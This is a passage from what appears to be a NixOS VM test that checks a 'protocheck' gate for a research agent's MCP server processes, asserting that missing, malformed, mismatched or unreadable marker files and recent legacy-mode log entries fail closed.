    MARKS = f"{RUN}/research-agent-mcp"
    LOG = "/home/jonathan/.cache/research-agent/server.log"
    def protocheck(args=""):
        return workstation.execute(as_jonathan(
            f"env XDG_RUNTIME_DIR={RUN} research-mcp-protocheck {args}"
        ))
    def mark(pid, content):
        workstation.succeed(
            f"printf %s {shlex.quote(content)} > /tmp/marker",
            as_jonathan(f"mkdir -p {MARKS}"),
            f"install -o jonathan -g users -m 0600 /tmp/marker {MARKS}/{pid}",
        )
    old_ts = workstation.succeed("date -d '-2 days' +%Y-%m-%dT%H:%M:%S").strip()
    new_ts = workstation.succeed("date -d '-1 hour' +%Y-%m-%dT%H:%M:%S").strip()
    workstation.succeed(as_jonathan(
        f"sh -c 'printf \"%s.000 INFO pid=1 research-agent dial mode=broker era=legacy-ok\\n\" {old_ts} > {LOG}'"
    ))
    workstation.wait_until_succeeds(f"test -d {RUN}")
    rc, out = protocheck()
    assert rc == 0, f"no MCP process, clean log: gate must pass: {out}"
    # A pre-pull MCP process (no marker) holds the gate shut.
    workstation.succeed(
        "systemd-run --uid=jonathan --unit=old-mcp ${pkgs.python3}/bin/python3 -c "
        "'import time; time.sleep(3600)' /nix/store/x-research-agent-mcp-bootstrap.py"
    )
    workstation.wait_until_succeeds("systemctl show -P MainPID old-mcp.service | grep -qv '^0$'")
    pid = workstation.succeed("systemctl show -P MainPID old-mcp.service").strip()
    rc, out = protocheck()
    assert rc != 0 and pid in out, f"unmarked MCP pid {pid} must fail the gate: rc={rc} {out}"
    # The marker holds its writer's own start tick (field 22 of
    # /proc/<pid>/stat, research-agent mcp_marker.py). Live only on an
    # exact match; everything else fails closed, and a fresh mtime proves
    # nothing.
    ticks = int(workstation.succeed(f"cat /proc/{pid}/stat").rsplit(")", 1)[1].split()[19])
    for content, why in ((str(ticks - 1), "start tick of another process (reused PID)"),
                         ("garbage", "malformed"),
                         ("", "empty")):
        mark(pid, content)
        rc, out = protocheck()
        print(f"[diag] protocheck, marker {why}: rc={rc} {out.strip()}")
        assert rc != 0 and pid in out, f"marker ({why}) must not pass pid {pid}: rc={rc} {out}"
    mark(pid, f"{ticks}\n")
    workstation.succeed(f"chmod 0000 {MARKS}/{pid}")
    rc, out = protocheck()
    print(f"[diag] protocheck, marker unreadable: rc={rc} {out.strip()}")
    assert rc != 0 and pid in out, f"an unreadable marker must fail closed: rc={rc} {out}"
    workstation.succeed(f"chmod 0600 {MARKS}/{pid}")
    # Exact match, even with an mtime older than the process: passes.
    workstation.succeed(f"touch -d '-1 day' {MARKS}/{pid}")
    rc, out = protocheck()
    print(f"[diag] protocheck, matching marker: rc={rc} {out.strip()}")
    assert rc == 0, f"marked MCP process: gate must pass: {out}"
    # A legacy dial inside the window holds it shut; outside it does not.
    workstation.succeed(as_jonathan(
        f"sh -c 'printf \"%s.000 INFO pid=2 research-agent dial mode=legacy reason=no-broker era=legacy-ok\\n\" {new_ts} >> {LOG}'"
    ))
    rc, out = protocheck()
    assert rc != 0 and "mode=legacy" in out, f"legacy dial in window must fail: {out}"
    rc, out = protocheck("--window-hours 0.5")
    assert rc == 0, f"legacy dial outside a 30 min window must pass: {out}"
    # A log that does not reach back over the whole window proves nothing.
    workstation.succeed(as_jonathan(
        f"sh -c 'printf \"%s.000 INFO pid=1 research-agent dial mode=broker\\n\" {new_ts} > {LOG}'"
    ))
    rc, out = protocheck()
    assert rc != 0, f"a log shorter than the window must fail the gate: {out}"
    workstation.succeed("systemctl stop old-mcp.service")
  '';
}
